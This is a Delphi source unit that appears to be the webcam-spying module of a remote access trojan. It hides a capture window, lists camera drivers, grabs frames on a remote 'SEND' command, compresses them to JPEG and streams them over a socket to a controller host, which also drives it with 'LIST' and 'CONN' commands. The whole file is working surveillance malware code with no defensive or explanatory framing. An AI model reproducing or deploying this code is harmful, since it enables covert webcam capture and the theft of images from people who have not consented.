unit uWebcam;

interface

uses windows,winsock,jpeg,graphics,classes;
Type
TInfo = Record
    Name        :String;
    Host        :String;
    Port        :Integer;
    Size        :Integer;
    FileSize    :Cardinal;
    Mutex       :Integer;
    SShot:extended;
    sFile:string;
    sScreenshotStringz:string;
  End;
  PInfo = ^TInfo;
const
  WM_CAP_START = $400;
  WM_CAP_DRIVER_CONNECT = WM_CAP_START + $a;
  WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + $b;
  WM_CAP_EDIT_COPY = WM_CAP_START + $1e;
  WM_CAP_GRAB_FRAME = WM_CAP_START + $3c;
  WM_CAP_STOP = WM_CAP_START + $44;
  WM_CAP_SAVEDIB = $0400 + 25;
var
  capturewindow:cardinal;
  libhandle:cardinal;
  CapGetDriverDescriptionA: function(DrvIndex:cardinal; Name:pansichar;NameLen:cardinal;Description:pansichar;DescLen:cardinal):boolean; stdcall;
  CapCreateCaptureWindowA: function(lpszWindowName: pchar; dwStyle: dword; x, y, nWidth, nHeight: word; ParentWin: dword; nId: word): dword; stdcall;
  function Connectwebcam(WebcamID:integer):boolean;
  function CaptureWebCam:HBITMAP;
  function ListCamDrivers: string;
  Function SendWebcams(P: Pointer): integer; STDCALL;
  procedure CloseWebcam();
  //CapCreateCaptureWindowA: function(lpszWindowName: pchar; dwStyle: cardinal; x, y, nWidth, nHeight: word; ParentWin: cardinal; nId: word): cardinal; stdcall;
implementation
Function IntToStr(Const Value: Integer): String;
Var S: String[11]; Begin Str(Value, S); Result := S; End;
Function StrToInt(Const S: String): Integer;
Var E: Integer; Begin Val(S, Result, E); End;

function Connectwebcam(WebcamID:integer):boolean;
begin
  if CaptureWindow <> 0 then begin
    SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    SendMessage(CaptureWindow, $0010, 0, 0);
    CaptureWindow := 0;
  end;
  CaptureWindow := capCreateCaptureWindowA('CaptureWindow', WS_CHILD and WS_VISIBLE, 0, 0, 0, 0, GetDesktopWindow, 0);
  if SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, WebcamID, 0) <> 1 then begin
    SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    SendMessage(CaptureWindow, $0010, 0, 0);
    CaptureWindow := 0;
    result := false;
  end else begin
    result := true;
  end;
end;
function GetBitmapFromFile(BitmapPath: string): HBitmap;
begin
  Result := LoadImage(GetModuleHandle(nil), pchar(BitmapPath), IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
end;
function ListCamDrivers: string;
var
  x:cardinal;
  names: string;
  Descriptions: string;
begin
  for x := 0 to 9 do begin
    setlength(Names,256);
    setlength(Descriptions,256);
    if not capGetDriverDescriptionA(x,pchar(Names),256,pchar(Descriptions),256) then continue;
    if length(Names) > 0 then result := result + '|' + '<' + inttostr(x) + '>'  + names ;
    end;
end;
procedure CloseWebcam();
begin
  SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
  SendMessage(CaptureWindow, $0010, 0, 0);
  CaptureWindow := 0;
end;
function CaptureWebCam:HBITMAP;
begin
  Result := 0;
  if CaptureWindow <> 0 then begin
  SendMessage(CaptureWindow, WM_CAP_GRAB_FRAME, 0, 0);
  SendMessage(CaptureWindow, WM_CAP_SAVEDIB, 0, longint(pchar('~image')));
  Result := GetBitmapFromFile('~image');
  DeleteFile(pchar('~image'));
  end;
end;

Function SendWebcams(P: Pointer): integer; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  data:string;
  BytesRead     :Cardinal;
  Buf           :Array[0..4000] Of Char;
  Host          :String;
  Port          :Integer;
  T             :String;
  Mutex         :integer;
  Len:integer;
  sBitmap:TBitmap;
  sJPEG:TJPEGImage;
  pf:tmemorystream;
Begin
  Mutex := pinfo(p)^.Mutex;
  Host := pInfo(P)^.Host;
  Port := pInfo(P)^.Port;
  //qual := pInfo(P)^.Size;
  sBitmap := TBitmap.Create;
  sJPEG := TJPEGImage.Create;
  pf := TMemoryStream.Create;
  WSAStartUp($0101, WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(port);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
  result := (connect(Sock, Addr, SizeOf(Addr)));
  if result = SOCKET_ERROR Then exit;
  T := '29|' + IntToStr(mutex) + '|' + #10;
  send(sock, t[1],length(T),0);
  repeat
    Len := Recv(sock, Buf, SizeOf(Buf), 0);
    If (Len <= 0) Then Break;
    Data := String(Buf);
    ZeroMemory(@Buf, SizeOf(Buf));
    if copy(data,1,4) = 'SEND' then begin
      sbitmap.FreeImage;
      pf.Clear;
      sBitmap.Handle := CaptureWebCam;
      sJPEG.Assign(sbitmap);
      delete(data,1,4);
      sJPEG.CompressionQuality := strtoint(data);
      sJPEG.Compress;
      sJPEG.SaveToStream(pf);
      T := '102'+inttostr(pf.Size) + '|';
      send(sock, t[1],length(T),0);
      {$I-}
      //sleep(50);
      pf.Position := 0;
      Repeat
      bytesread := pf.Read(Buf, SizeOf(Buf));
      If (BytesRead = 0) Then Break;
      Send(Sock, Buf[0], SizeOf(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      //Recv(Sock, Buf, SizeOf(Buf), 0);
      Until BytesRead = 0;
    end;
    if copy(data,1,4) = 'LIST' then begin
       t := '101' + ListCamDrivers + #10;
       send(sock, t[1],length(T),0);
    end;
    if copy(data,1,4) = 'CONN' then begin
      connectwebcam(strtoint(copy(data,4,1)));
      t := '103' + #10;
      send(sock, t[1],length(T),0);
    end;
until 1 = 3;
    pf.Free;
    sBitmap.Free;
    sJPEG.Free;
    closewebcam;
    {$I+}
End;
initialization
  LibHandle := LoadLibrary('avicap32.dll');
  CapGetDriverDescriptionA := GetProcAddress(LibHandle,'capGetDriverDescriptionA');
  CapCreateCaptureWindowA := GetProcAddress(LibHandle,'capCreateCaptureWindowA');

end.
 